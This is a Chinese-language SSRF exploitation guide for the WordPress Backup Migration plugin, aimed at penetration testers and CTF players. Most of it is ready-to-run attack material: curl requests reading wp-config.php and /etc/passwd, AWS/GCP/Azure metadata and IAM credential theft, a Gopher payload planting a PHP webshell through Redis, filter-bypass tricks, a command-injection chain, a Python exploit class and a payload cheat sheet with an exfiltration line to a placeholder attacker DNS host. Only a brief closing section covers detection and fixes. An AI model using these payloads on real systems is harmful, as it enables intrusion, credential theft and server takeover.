# WordPress 备份插件 SSRF 攻击

## 1. 概述

本文档描述针对 WordPress Backup Migration 插件 v1.3.5 的服务器端请求伪造 (SSRF) 攻击方法论。该插件的 `download-backup` 功能允许用户指定远程 URL 下载备份文件，但未对 URL 协议、目标地址进行任何验证，导致严重的 SSRF 漏洞。

### 1.1 漏洞本质

插件的 `handleQuickMigration()` 函数接收用户可控的 `url` 参数，仅进行 cosmetic 转换（空格转义），随后直接传递给 `curl_init()`。cURL 配置禁用了 SSL 验证、允许重定向跟随、无超时限制，且**支持所有 libcurl 协议**（包括 `file://`、`gopher://`、`dict://` 等危险协议）。

### 1.2 适用范围

- WordPress Backup Migration 插件 v1.3.5 及更早版本
- 任何存在任意 URL 下载功能的 Web 应用
- CTF 挑战中存在 SSRF 端点的应用
- 云环境元数据服务探测

### 1.3 读者对象

- 执行 WordPress 渗透测试的安全工程师
- CTF 竞赛参赛者
- 进行 SSRF 漏洞评估的安全分析师

---

## 2. 攻击场景

### 2.1 前置条件

| 条件 | 要求 | 说明 |
|------|------|------|
| 认证 | 任意 WordPress 认证用户 | 由于 `is_admin()` 权限检查缺陷，Subscriber 级别即可利用 |
| Nonce | 有效的 backup-migration-ajax nonce | 可从任何 /wp-admin/ 页面提取 |
| 插件版本 | Backup Migration v1.3.5 | 或其他存在相同漏洞的版本 |

### 2.2 可利用协议

| 协议 | 用途 | 风险等级 |
|------|------|----------|
| `file://` | 本地文件读取 | 🔴 CRITICAL |
| `http://` / `https://` | 标准 SSRF、内网探测 | 🟠 HIGH |
| `gopher://` | 协议走私、Redis/MySQL 攻击 | 🔴 CRITICAL |
| `dict://` | 服务枚举、Banner 抓取 | 🟡 MEDIUM |
| `ftp://` / `ftps://` | 文件传输、内网探测 | 🟡 MEDIUM |
| `ldap://` | LDAP 查询注入 | 🟠 HIGH |

### 2.3 攻击目标

| 目标类型 | 具体目标 | 利用方式 |
|----------|----------|----------|
| 本地文件 | `/opt/flag.txt`、`/etc/passwd`、`wp-config.php` | `file://` 协议 |
| 云元数据 | AWS/GCP/Azure 元数据服务 | `http://` 协议 |
| 内网服务 | Redis、MySQL、MongoDB | `gopher://` 协议 |
| 端口扫描 | 内网主机开放端口 | `http://` + 时序分析 |

---

## 3. 漏洞探测方法

### 3.1 认证与 Nonce 获取

**步骤 1: 获取认证会话**

```bash
# 使用已知凭证登录
curl -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -d "log=admin&pwd=AdminPass123&wp-submit=Log+In&testcookie=1" \
  "http://target:45513/wp-login.php"
```

**步骤 2: 提取 AJAX Nonce**

```bash
# 访问备份插件管理页面提取 nonce
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin.php?page=backup-migration" \
  | grep -oP 'nonce["\s:=]+[a-f0-9]+' | head -1
```

**输出示例:**
```
6028f64c82
```

### 3.2 SSRF 验证 - HTTP 协议

**步骤 1: 启动 HTTP 监听器**

```bash
# 使用 Python 启动简易 HTTP 服务器
python3 -m http.server 8888 > /tmp/http_server.log 2>&1 &

# 或使用 nc 监听
nc -lvnp 8888
```

**步骤 2: 发送 SSRF 请求**

```bash
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "url=http://ATTACKER_IP:8888/test-ssrf&nonce=6028f64c82"
```

**步骤 3: 验证回调**

```bash
# 检查 HTTP 服务器日志
cat /tmp/http_server.log
```

**预期输出:**
```
::ffff:127.0.0.1 - - [29/Oct/2025 12:28:12] "GET /test-ssrf HTTP/1.1" 404 -
```

**说明:** 请求来自 `127.0.0.1`（WordPress 容器内部），证明 SSRF 成功。

### 3.3 SSRF 验证 - file:// 协议

**直接读取本地文件:**

```bash
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "url=file:///etc/passwd&nonce=6028f64c82"
```

**响应:**
```json
{"status":"cli_download","message":"File download initiated"}
```

**说明:** 文件内容被下载为备份文件，可通过备份下载端点获取。

---

## 4. 漏洞利用方法

### 4.1 利用方式一：file:// 协议读取本地文件

**目标:** 读取 `/opt/flag.txt`

**步骤 1: 触发 SSRF 下载**

```bash
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "url=file:///opt/flag.txt&nonce=6028f64c82"
```

**响应:**
```json
{"status":"cli_download","message":"File download initiated"}
```

**步骤 2: 获取备份文件**

```bash
# 列出可用备份文件
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=get-current-backups&nonce=6028f64c82"

# 下载备份文件（假设文件名为 BM_Backup_2024-06-12_07_33_40_GXqBuZDysjW4Hpx6.zip）
curl -b /tmp/cookies.txt \
  "http://target:45513/?backup-migration=BMI_BACKUP&backup-id=BM_Backup_2024-06-12_07_33_40_GXqBuZDysjW4Hpx6.zip" \
  -o /tmp/stolen_backup.zip

# 解压并查看内容
unzip -l /tmp/stolen_backup.zip
unzip -p /tmp/stolen_backup.zip flag.txt
```

**输出:**
```
FLAG{0e640864c2718bb34e01e700391986e28ecd6fbe98b4569ef4ccc4cee16a4b2c}
```

### 4.2 利用方式二：读取 WordPress 配置文件

**目标:** 获取数据库凭证和 WordPress 密钥

```bash
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "url=file:///var/www/html/wp-config.php&nonce=6028f64c82"
```

**提取的内容包含:**

```php
define('DB_NAME', 'challenge');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'wordpress');

define('AUTH_KEY', 'random-key-here');
define('SECURE_AUTH_KEY', 'random-key-here');
// ... 其他密钥
```

**利用价值:**
- 数据库凭证可用于直接连接 MySQL
- WordPress 密钥可用于伪造认证 Cookie

### 4.3 利用方式三：云元数据服务探测

**AWS EC2 元数据:**

```bash
# 获取实例元数据
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "url=http://169.254.169.254/latest/meta-data/&nonce=6028f64c82"

# 获取 IAM 角色凭证
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&nonce=6028f64c82"
```

**GCP 元数据:**

```bash
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "url=http://metadata.google.internal/computeMetadata/v1/instance/&nonce=6028f64c82" \
  -H "Metadata-Flavor: Google"
```

**Azure 元数据:**

```bash
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "url=http://169.254.169.254/metadata/instance?api-version=2021-02-01&nonce=6028f64c82"
```

### 4.4 利用方式四：内网端口扫描

**原理:** 通过响应时间差异判断端口开放状态

**Python 扫描脚本:**

```python
#!/usr/bin/env python3
import requests
import time

TARGET = "http://localhost:45513"
COOKIE = {"wordpress_logged_in": "SESSION_COOKIE"}
NONCE = "6028f64c82"

def check_port(port):
    url = f"http://127.0.0.1:{port}/"
    
    start = time.time()
    resp = requests.post(f"{TARGET}/wp-admin/admin-ajax.php",
                        cookies=COOKIE,
                        data={
                            "action": "backup_migration",
                            "token": "bmi",
                            "f": "download-backup",
                            "nonce": NONCE,
                            "url": url
                        })
    elapsed = time.time() - start
    
    # 开放端口通常响应更快
    if elapsed < 2.0:
        print(f"[+] Port {port}: OPEN (response: {elapsed:.3f}s)")
    else:
        print(f"[-] Port {port}: CLOSED/FILTERED (response: {elapsed:.3f}s)")

# 扫描常见端口
ports = [22, 80, 3306, 6379, 8080, 27017]
for port in ports:
    check_port(port)
```

**预期输出:**
```
[+] Port 80: OPEN (response: 0.523s)
[+] Port 3306: OPEN (response: 0.891s)
[-] Port 22: CLOSED/FILTERED (response: 5.234s)
```

### 4.5 利用方式五：Gopher 协议攻击 Redis

**目标:** 通过 SSRF 向 Redis 写入 Webshell

**步骤 1: 构造 Gopher Payload**

```python
#!/usr/bin/env python3
import urllib.parse

# Redis 命令：写入 Webshell
commands = [
    "FLUSHALL",  # 清空数据库
    "SET payload <?php system($_GET['cmd']); ?>",  # 设置 payload
    "CONFIG SET dir /var/www/html/",  # 设置目录
    "CONFIG SET dbfilename shell.php",  # 设置文件名
    "SAVE"  # 保存
]

# 构造 Redis 协议
redis_payload = ""
for cmd in commands:
    parts = cmd.split()
    redis_payload += f"*{len(parts)}\r\n"
    for part in parts:
        redis_payload += f"${len(part)}\r\n{part}\r\n"

# URL 编码
encoded = urllib.parse.quote(redis_payload)
gopher_url = f"gopher://127.0.0.1:6379/_{encoded}"

print(gopher_url)
```

**步骤 2: 发送 SSRF 请求**

```bash
# 使用上一步生成的 Gopher URL
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "url=[GOPHER_URL_FROM_STEP_1]&nonce=6028f64c82"
```

**步骤 3: 验证 Webshell**

```bash
# 访问 Webshell 执行命令
curl "http://target:45513/wp-content/uploads/shell.php?cmd=whoami"
```

**输出:**
```
www-data
```

---

## 5. 绕过方法

### 5.1 绕过协议过滤

**场景:** 如果应用过滤 `file://` 协议

**绕过技术:**

```bash
# 大小写混合
url='FILE:///opt/flag.txt'

# 双重 URL 编码
url='file%253a%252f%252f%252fopt%252fflag.txt'

# 使用其他协议
url='gopher://127.0.0.1:80/GET /opt/flag.txt'
url='dict://127.0.0.1:6379/INFO'
```

### 5.2 绕过 IP 过滤

**场景:** 如果应用过滤 `127.0.0.1` 或 `localhost`

**绕过技术:**

```bash
# 十进制 IP
127.0.0.1 = 2130706433
url='http://2130706433:80/'

# 八进制 IP
127.0.0.1 = 0177.0.0.1
url='http://0177.0.0.1:80/'

# IPv6 格式
url='http://[::1]:80/'
url='http://[0:0:0:0:0:ffff:7f00:1]:80/'

# DNS 重绑定
# 使用 DNS 重绑定服务
url='http://rebind.pro:80/'

# 使用 localhost 变体
url='http://localhost:80/'
url='http://local.host:80/'
```

### 5.3 绕过端口过滤

**场景:** 如果应用过滤特定端口

**绕过技术:**

```bash
# 使用默认端口（可省略）
url='http://127.0.0.1/'  # 默认 80
url='https://127.0.0.1/'  # 默认 443

# 使用重定向
url='http://ATTACKER_SERVER:80/redirect'
# ATTACKER_SERVER 返回 302 重定向到 http://127.0.0.1:6379/
```

### 5.4 绕过 URL 长度限制

**场景:** 如果 URL 长度受限

**绕过技术:**

```bash
# 使用短 URL 服务
# 1. 创建重定向页面
echo '<?php header("Location: file:///opt/flag.txt"); ?>' > /var/www/html/r.php

# 2. 使用短 URL
url='http://ATTACKER_SERVER/r.php'
```

---

## 6. 组合攻击

### 6.1 SSRF + 命令注入组合

**场景:** SSRF 读取文件 + 命令注入外带数据

```bash
# 步骤 1: 使用 SSRF 读取 flag
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "url=file:///opt/flag.txt&nonce=6028f64c82"

# 步骤 2: 使用命令注入将 flag 写入 Web 目录
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d 'url=http://test";cp /opt/flag.txt /var/www/html/wp-content/uploads/flag.txt;echo "'

# 步骤 3: 通过 HTTP 获取 flag
curl "http://target:45513/wp-content/uploads/flag.txt"
```

### 6.2 SSRF + SQL 注入组合

**场景:** SSRF 探测数据库端口 + SQL 注入提取数据

```bash
# 步骤 1: 使用 SSRF 确认 MySQL 端口开放
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "url=http://127.0.0.1:3306/&nonce=6028f64c82"

# 步骤 2: 使用 SQL 表名注入提取数据
# (参考 sql-injection-table-name.md 方法论文档)
```

---

## 7. 自动化利用脚本

### 7.1 Python SSRF 利用框架

```python
#!/usr/bin/env python3
"""
WordPress Backup Migration SSRF Exploit
Supports: file://, http://, gopher:// protocols
"""

import requests
import sys
from urllib.parse import quote

class WordPressSSRF:
    def __init__(self, target, cookie, nonce):
        self.target = target
        self.cookie = {"wordpress_logged_in": cookie}
        self.nonce = nonce
    
    def ssrf_request(self, url):
        """发送 SSRF 请求"""
        endpoint = f"{self.target}/wp-admin/admin-ajax.php"
        
        data = {
            "action": "backup_migration",
            "token": "bmi",
            "f": "download-backup",
            "nonce": self.nonce,
            "url": url
        }
        
        resp = requests.post(endpoint, cookies=self.cookie, data=data)
        return resp.json()
    
    def read_file(self, filepath):
        """使用 file:// 协议读取文件"""
        url = f"file://{filepath}"
        print(f"[*] Reading {filepath}...")
        result = self.ssrf_request(url)
        print(f"[+] Response: {result}")
        return result
    
    def scan_port(self, host, port):
        """扫描端口"""
        url = f"http://{host}:{port}/"
        print(f"[*] Scanning {host}:{port}...")
        result = self.ssrf_request(url)
        return result
    
    def gopher_attack_redis(self, host, port, payload):
        """Gopher 协议攻击 Redis"""
        encoded = quote(payload)
        url = f"gopher://{host}:{port}/_{encoded}"
        print(f"[*] Sending Gopher payload to {host}:{port}...")
        result = self.ssrf_request(url)
        return result

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <command>")
        print("Commands:")
        print(f"  {sys.argv[0]} read /path/to/file")
        print(f"  {sys.argv[0]} scan 127.0.0.1 3306")
        sys.exit(1)
    
    target = "http://localhost:45513"
    cookie = "SESSION_COOKIE_HERE"
    nonce = "6028f64c82"
    
    exploit = WordPressSSRF(target, cookie, nonce)
    
    command = sys.argv[1]
    
    if command == "read":
        filepath = sys.argv[2]
        exploit.read_file(filepath)
    
    elif command == "scan":
        host = sys.argv[2]
        port = int(sys.argv[3])
        exploit.scan_port(host, port)

if __name__ == "__main__":
    main()
```

---

## 8. 检测与防御

### 8.1 检测指标

| 指标 | 检测方法 |
|------|----------|
| 出站连接异常 | 监控到 127.0.0.1、169.254.169.254 的连接 |
| 危险协议使用 | 监控 cURL 使用 file://、gopher:// 协议 |
| 备份下载频率异常 | 监控单位时间内 download-backup 请求数量 |
| 响应时间异常 | SSRF 请求通常响应时间较长 |

### 8.2 修复建议

**代码修复:**

```php
// 修复方案 1: 协议白名单
$allowed_protocols = ['https'];
$parsed = parse_url($url);
if (!isset($parsed['scheme']) || !in_array($parsed['scheme'], $allowed_protocols, true)) {
    return ['status' => 'error', 'message' => 'Invalid protocol'];
}

// 修复方案 2: 域名白名单
$allowed_domains = ['backup.example.com', 'cdn.backups.net'];
if (!in_array($parsed['host'], $allowed_domains, true)) {
    return ['status' => 'error', 'message' => 'Domain not in allowlist'];
}

// 修复方案 3: 使用 WordPress HTTP API
$response = wp_safe_remote_get($url, [
    'timeout' => 30,
    'redirection' => 0,
    'sslverify' => true,
    'reject_unsafe_urls' => true,  // 启用私有 IP 阻止
]);

// 修复方案 4: 禁用危险协议
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP);
curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP);
```

**配置修复:**

```bash
# 在 php.ini 中禁用危险协议
disable_functions = curl_exec

# 或使用 Suhosin 扩展
suhosin.executor.func.blacklist = curl_exec
```

---

## 9. 参考资源

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [SSRF Bible](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/SSRF/SSRF-BypassVectors.fuzzdb)
- [Gopherus Tool](https://github.com/tarunkant/Gopherus)

---

## 10. 附录：Payload 速查表

| 目标 | Payload |
|------|---------|
| 读取本地文件 | `file:///opt/flag.txt` |
| 读取 passwd | `file:///etc/passwd` |
| 读取 wp-config | `file:///var/www/html/wp-config.php` |
| AWS 元数据 | `http://169.254.169.254/latest/meta-data/` |
| GCP 元数据 | `http://metadata.google.internal/computeMetadata/v1/` |
| Redis INFO | `gopher://127.0.0.1:6379/_INFO` |
| MySQL 版本 | `gopher://127.0.0.1:3306/_%00%00%00%01%85%07%40%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00` |
| 端口扫描 | `http://127.0.0.1:[PORT]/` |
| DNSLog 外带 | `http://ATTACKER_DNSLOG.com/$(cat /opt/flag.txt|base64)` |
